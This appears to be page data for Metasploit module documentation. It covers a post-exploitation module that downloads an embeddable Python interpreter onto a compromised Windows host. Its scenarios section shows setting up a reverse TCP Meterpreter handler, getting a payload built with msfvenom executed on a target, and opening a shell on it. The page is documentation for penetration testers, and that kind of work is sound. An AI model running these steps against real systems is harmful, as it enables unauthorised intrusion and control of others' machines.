{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/post/windows/manage/install_python","result":{"data":{"moduleMetadataJson":{"id":"73a0040c-67b4-5d4c-ba19-543ddc06f5f5","name":"Install Python for Windows","fullname":"post/windows/manage/install_python","description":"This module places an embeddable Python3 distribution onto the target file system,\n                        granting pentesters access to a lightweight Python interpreter.\n                        This module does not require administrative privileges or user interaction with\n                        installation prompts.","rank":300,"fields":{"detailsSlug":"/modules/details/post/windows/manage/install_python","documentationSlug":"/modules/documentation/post/windows/manage/install_python"},"documentation":{"html":"<h2 id=\"overview\" style=\"position:relative;\"><a href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview</h2>\n<p>This module downloads an embeddable Python3 distribution onto the target\nfile system, granting pentesters access to a lightweight Python\ninterpreter. This module does not require administrative privileges or\nuser interaction with installation prompts.\nThis is useful in cases where the in-memory python interpreter might\nbe limited.  If you only want to run a python script while connected,\nsee <a href=\"https://github.com/rapid7/metasploit-framework/wiki/Python-Extension\">https://github.com/rapid7/metasploit-framework/wiki/Python-Extension</a>.</p>\n<h2 id=\"tested-version\" style=\"position:relative;\"><a href=\"#tested-version\" aria-label=\"tested version permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tested Version</h2>\n<p>This module has been tested against:</p>\n<ol>\n<li>Windows 10, 1903</li>\n</ol>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start msfconsole</li>\n<li>Get a Meterpreter session</li>\n<li>Do: <code class=\"language-text\">use post/windows/manage/install_python</code></li>\n<li>Do: <code class=\"language-text\">set SESSION #</code></li>\n<li>Optional Do: <code class=\"language-text\">set PYTHON_VERSION</code></li>\n<li>Optional Do: <code class=\"language-text\">set PYTHON_URL</code></li>\n<li>Optional Do: <code class=\"language-text\">set FILE_PATH</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>PYTHON_VERSION</strong></p>\n<p>  Specifies the Python version you would like to download. Downloads Python version 3.8.2 by default.</p>\n<p>  <strong>PYTHON_URL</strong></p>\n<p>  Specifies the URL used to download the Python embeddable zip file.</p>\n<p>  <strong>FILE_PATH</strong></p>\n<p>  Specifies the directory to place the Python embeddable zip file.\nPlaces Python zip file in the current working directory by default.</p>\n<p>  <strong>CLEANUP</strong></p>\n<p>  If true, this option will delete the Python zip file as well as its extracted contents. It will also terminate running processes with name 'python', as you cannot delete the Python interpreter if it is actively running.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<p>Get initial access: Create a Meterpreter exe using msfvenom, then transfer it to the target system via web server, SMB, etc. Execute the payload to get a session.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; handler -H 0.0.0.0 -P 4444 -p windows/meterpreter/reverse_tcp\n[*] Payload handler running as background job 0.\n\n[*] Started reverse TCP handler on 0.0.0.0:4444 \nmsf5 &gt; \n[*] Sending stage (180291 bytes) to 192.168.13.129\n[*] Meterpreter session 1 opened (192.168.13.130:4444 -&gt; 192.168.13.129:50069) at 2020-03-04 20:32:59 -0500</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Use the post module to install Python on the target filesystem</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use post/windows/manage/install_python \nmsf5 post(windows/manage/install_python) &gt; set SESSION 1\nSESSION =&gt; 1\nmsf5 post(windows/manage/install_python) &gt; exploit \n\n[*] Downloading Python embeddable zip from https://www.python.org/ftp/python/3.8.2/python-3.8.2-embed-win32.zip\n[+] Compressed size: 1112\n[*] Extracting Python zip file: .\\python-3.8.2-embed-win32.zip\n[+] Compressed size: 952\n[*] Ready to execute Python; spawn a command shell and enter:\n[+] .\\python-3.8.2-embed-win32\\python.exe -c &quot;print(&#39;Hello, world!&#39;)&quot;\n[!] Avoid using this python.exe interactively, as it will likely hang your terminal; use script files or 1 liners instead\n[*] Post module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Verify Python works</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 post(windows/manage/install_python) &gt; sessions -i 1 \n[*] Starting interaction with 1...\n\nmeterpreter &gt; shell\nProcess 2688 created.\nChannel 5 created.\nMicrosoft Windows [Version 10.0.17763.1039]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Users\\buddha\\AppData\\Local\\Temp&gt;.\\python-3.8.2-embed-win32\\python.exe -c &quot;print(&#39;Hello, world!&#39;)&quot;\n.\\python-3.8.2-embed-win32\\python.exe -c &quot;print(&#39;Hello, world!&#39;)&quot;\nHello, world!</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Note that running this Python interpreter interactively may hang your command shell.</p>"}}},"pageContext":{"id":"73a0040c-67b4-5d4c-ba19-543ddc06f5f5"}}}